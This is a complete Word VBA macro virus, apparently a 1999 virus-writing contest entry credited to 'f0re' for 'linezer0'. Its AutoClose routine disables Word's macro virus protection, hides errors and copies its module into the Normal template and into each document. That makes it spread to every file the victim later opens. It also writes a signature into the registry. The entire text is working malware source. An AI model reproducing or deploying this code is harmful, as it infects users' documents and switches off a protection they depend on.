   Attribute VB_Name = "aaaaa"
   Sub AutoClose()
   On Error Resume Next
   Options.VirusProtection = False
   If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "aaaaa" Then Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "aaaaa", wdOrganizerObjectProjectItems
   If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "aaaaa" Then Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "aaaaa", wdOrganizerObjectProjectItems
   System.PrivateProfileString("", "HKEY_CURRENT_USER\", "weather") = "f0re's Macro Contest Contribution !"
   End Sub

   'weather (c)1999 f0re
   'contribution to the linezer0 macro contest
